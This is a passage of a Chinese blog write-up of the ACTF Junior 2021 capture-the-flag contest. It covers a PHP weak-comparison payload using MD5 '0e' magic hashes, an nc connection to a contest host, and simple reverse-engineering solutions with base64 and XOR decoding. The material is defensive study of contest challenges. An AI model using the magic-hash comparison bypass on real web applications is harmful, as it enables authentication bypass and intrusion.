+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">output: </span><br><span class="line">0e215962017 0e291242476940776845150308577824</span><br><span class="line">0e215962017 0e291242476940776845150308577824</span><br><span class="line">0e730083352 0e870635875304277170259950255928</span><br><span class="line">0e807097110 0e318093639164485566453180786895</span><br></pre></td></tr></table></figure>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;1&amp;b&#x3D;0&amp;c&#x3D;0e215962017</span><br></pre></td></tr></table></figure>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Do-you-know-PRNG"><a href="#Do-you-know-PRNG" class="headerlink" title="Do_you_know_PRNG"></a>Do_you_know_PRNG</h2><h2 id="hashgame"><a href="#hashgame" class="headerlink" title="hashgame"></a>hashgame</h2><h2 id="miaomiaomiao"><a href="#miaomiaomiao" class="headerlink" title="miaomiaomiao"></a>miaomiaomiao</h2><h2 id="miaomiaomiao2-0"><a href="#miaomiaomiao2-0" class="headerlink" title="miaomiaomiao2.0"></a>miaomiaomiao2.0</h2><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222160137762.png" alt="image-20210222160137762"></p>
+<p>直接在terminal里输入nc 139.155.83.108 10006即可获得shell，老规矩</p>
+<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="How2Reverse"><a href="#How2Reverse" class="headerlink" title="How2Reverse"></a>How2Reverse</h2><p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222160938331.png" alt="image-20210222160938331"></p>
+<p>ida打开直接有flag，或者直接在notepad++搜字符串，linux直接strings How2Reverse.exe</p>
+<h2 id="How2b64decode"><a href="#How2b64decode" class="headerlink" title="How2b64decode"></a>How2b64decode</h2><p>ida打开文件在main里按F5</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222161202313.png" alt="image-20210222161202313"></p>
+<p>得到字符串<code>QUNURntCYXNlNjRfaXNfYV90cmFkaW9uYWxfY29kaW5nX2FsZ29yaXRobX0=</code></p>
+<p>v3被我改成了length,可以看到Str被传入之后和length一起进入了sub_401550函数，进去康康</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222161411517.png" alt="image-20210222161411517"></p>
+<p>常见的base64加密，康康编码表</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222161703070.png" alt="image-20210222161703070"></p>
+<p>表都没换，直接base64解密得到flag</p>
+<h2 id="How2debug"><a href="#How2debug" class="headerlink" title="How2debug"></a>How2debug</h2><h2 id="How2idaXref"><a href="#How2idaXref" class="headerlink" title="How2idaXref"></a>How2idaXref</h2><p>ida看下main没发现什么东西</p>
+<p>打开文件康康有输入</p>
+<p>ida函数表有scanf函数，追踪得到关键代码</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222163056230.png" alt="image-20210222163056230"></p>
+<p>F5进去康康</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222163159413.png" alt="image-20210222163159413"></p>
+<p>发现输入字符串先做Xor再与内存的0x3A个字节比较，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;41 42 56 45 7F 6D 69 70 57 6D 65 54 75 62 7B 50 76 78 7C 77 4B 61 7E 7E 6B\</span></span><br><span class="line"><span class="string">     46 7B 6F 68 6F 77 7D 55 55 47 7C 47 4A 48 54 5C 5B 5F\</span></span><br><span class="line"><span class="string">          48 58 42 5C 70 56 44 5C 50 40 5C 59 59 45 00 00 00 00 00 00 00&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">c=[<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">m=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3A</span>):</span><br><span class="line">    m+=<span class="built_in">chr</span>(i^c[i])</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
+<h2 id="Daisy"><a href="#Daisy" class="headerlink" title="Daisy"></a>Daisy</h2><h2 id="How2idapython"><a href="#How2idapython" class="headerlink" title="How2idapython"></a>How2idapython</h2><h2 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h2><h2 id="pyde"><a href="#pyde" class="headerlink" title="pyde"></a>pyde</h2><h2 id="Bytecode"><a href="#Bytecode" class="headerlink" title="Bytecode"></a>Bytecode</h2>
+  </div>
+  <!--文末结束语-->
+  
+    <div style="text-align:center;color: #ccc;font-size:24px;"> --- 本文结束 <i class="iconfont icon-heartbeat" style="font-size:24px;"></i> The End --- </div>
+  
+  <!--页脚广告-->
+  
+  <div class="mdui-divider"></div>
+  
+  <nav>
+    
+    
+      <a rel="next" class="post-nav-item mdui-float-right" href="/2021/02/01/md5%E7%A2%B0%E6%92%9E/">
+        <span>md5碰撞</span>
+        <i class="iconfont icon-angle-right"></i>
+      </a>
+    
+  </nav>
+</article>
+
+
+
+
+  <div class="toc-button"  style="z-index: 100;">
+    <button class="mdui-fab mdui-ripple mdui-color-teal" mdui-menu="{target: '#toc'}"><i class="iconfont icon-list"></i></button>
+    <ul class="mdui-menu" id="toc">
+      <li class="mdui-menu-item">
+        <a href="/2021/02/22/%E8%AE%B0%E5%BD%95ACTF-Junior-2021%E7%9A%84%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B/" id="toc-header" class="mdui-ripple">Table of Contents</a>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-way"><span class="toc-number">1.2.</span> <span class="toc-text">Real_way</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%B3%E4%BB%80%E5%9D%87%E8%A1%A1"><span class="toc-number">1.3.</span> <span class="toc-text">纳什均衡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8E%E7%86%8A%E8%AE%BA%E9%81%93"><span class="toc-number">1.4.</span> <span class="toc-text">与熊论道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E6%91%B8%E9%B1%BC"><span class="toc-number">1.5.</span> <span class="toc-text">禁止摸鱼</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-serialize"><span class="toc-number">2.1.</span> <span class="toc-text">baby_serialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Do-You-like-Python"><span class="toc-number">2.2.</span> <span class="toc-text">Do_You_like_Python?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyeasySQL"><span class="toc-number">2.3.</span> <span class="toc-text">easyeasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%83%B3%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%9F"><span class="toc-number">2.4.</span> <span class="toc-text">想执行命令？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linkgame"><span class="toc-number">2.5.</span> <span class="toc-text">linkgame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyUpload"><span class="toc-number">2.6.</span> <span class="toc-text">easyUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyXSS"><span class="toc-number">2.7.</span> <span class="toc-text">easyXSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easySSRF"><span class="toc-number">2.8.</span> <span class="toc-text">easySSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#esay-look"><span class="toc-number">2.9.</span> <span class="toc-text">esay_look</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Do-you-know-PRNG"><span class="toc-number">3.1.</span> <span class="toc-text">Do_you_know_PRNG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hashgame"><span class="toc-number">3.2.</span> <span class="toc-text">hashgame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#miaomiaomiao"><span class="toc-number">3.3.</span> <span class="toc-text">miaomiaomiao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#miaomiaomiao2-0"><span class="toc-number">3.4.</span> <span class="toc-text">miaomiaomiao2.0</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#test-your-nc"><span class="toc-number">4.1.</span> <span class="toc-text">test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary"><span class="toc-number">4.2.</span> <span class="toc-text">Canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">4.3.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-number">4.4.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">4.5.</span> <span class="toc-text">ret2libc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#How2Reverse"><span class="toc-number">5.1.</span> <span class="toc-text">How2Reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How2b64decode"><span class="toc-number">5.2.</span> <span class="toc-text">How2b64decode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How2debug"><span class="toc-number">5.3.</span> <span class="toc-text">How2debug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How2idaXref"><span class="toc-number">5.4.</span> <span class="toc-text">How2idaXref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Daisy"><span class="toc-number">5.5.</span> <span class="toc-text">Daisy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How2idapython"><span class="toc-number">5.6.</span> <span class="toc-text">How2idapython</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Threads"><span class="toc-number">5.7.</span> <span class="toc-text">Threads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pyde"><span class="toc-number">5.8.</span> <span class="toc-text">pyde</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bytecode"><span class="toc-number">5.9.</span> <span class="toc-text">Bytecode</span></a></li></ol></li></ol>
+      </li>
+    </ul>
+  </div>
+
+
+
+    <div id="comment" class="mdui-card mdui-p-a-2 mdui-m-b-5">
+      <div class="mdui-tab" mdui-tab>
+        
+          <a href="#comment-tab0" class="mdui-ripple">gitalk</a>
+        
+          <a href="#comment-tab1" class="mdui-ripple">livere</a>
+        
+      </div>
+      
+        <div id="comment-tab0" class="mdui-p-a-2">
+          <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+<script>
+  var gitalk = new Gitalk({
+    clientID: '',
+    clientSecret: '',
+    repo: '',
+    owner: '',
+    admin: [''],
+    id:  md5(location.pathname) ,
+    distractionFreeMode: 'true',
+  });
+  gitalk.render('gitalk-container');
+</script>
+        </div>
+      
+        <div id="comment-tab1" class="mdui-p-a-2">
+          <div id="lv-container" data-id="city" data-uid="">
+  <script type="text/javascript">
+    (function (d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+      if (typeof LivereTower === 'function') { return; }
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+      e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+  </script>
+  <noscript>Please enable JavaScript to view the comments powered by LiveRe.</noscript>
+</div>
+        </div>
+      
+    </div>
+
+  </main>
+  <footer id="footer" class="mdui-text-center mdui-m-t-5 mdui-p-b-2 mdui-p-t-4 mdui-color-theme">
+  <div class="mdui-container">
+    <div class="mdui-row">
+      
+        <a href="https://beian.miit.gov.cn" rel="noopener" target="_blank"></a>
+      
+      <span>
+        &copy; 2015 - 2021 
+        
+          <span style="color:#d9333f" class="iconfont icon-heart"></span>
+        
+        John Doe
+      </span>
+    </div>
+    <div class="mdui-row">
+      
+        <div class="mdui-col-xs-6 mdui-text-right">
+          <span>Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a></span>
+        </div>
+        <div class="mdui-col-xs-6 mdui-text-left">
+          <span>Theme: <a href="https://github.com/kb1000fx/Meadow" rel="noopener" target="_blank">Meadow</a></span>
+        </div>
+      
+    </div>
+    <div class="mdui-row">
+      
+        <div class="mdui-col-xs-6 mdui-text-right">
+          <span id="busuanzi_container_site_uv" style="display: none;"> <span class="iconfont icon-user"></span>Total Visitors <span id="busuanzi_value_site_uv"></span></span>
+        </div>
+        <div class="mdui-col-xs-6 mdui-text-left">
+          <span id="busuanzi_container_site_pv" style="display: none;"> <span class="iconfont icon-eye"></span>Total Views <span id="busuanzi_value_site_pv"></span></span>
+        </div>
+      
+    </div>
+ </div>
+</footer>
+  
+  <button id="gotop" class="mdui-fab mdui-fab-fixed mdui-fab-hide mdui-ripple mdui-color-teal" style="z-index:100;"><i class="iconfont icon-arrowup"></i></button>
+  
+  
+
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.8/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({
+        startOnLoad: true,
+        theme: "default"
+    });</script>
+
+
+
+
+    
+<script src="/js/mdui.min.v1.0.0.js"></script>
+
+
+
+
+<script src="/js/meadow.js"></script>
+
+</body>
+</html >
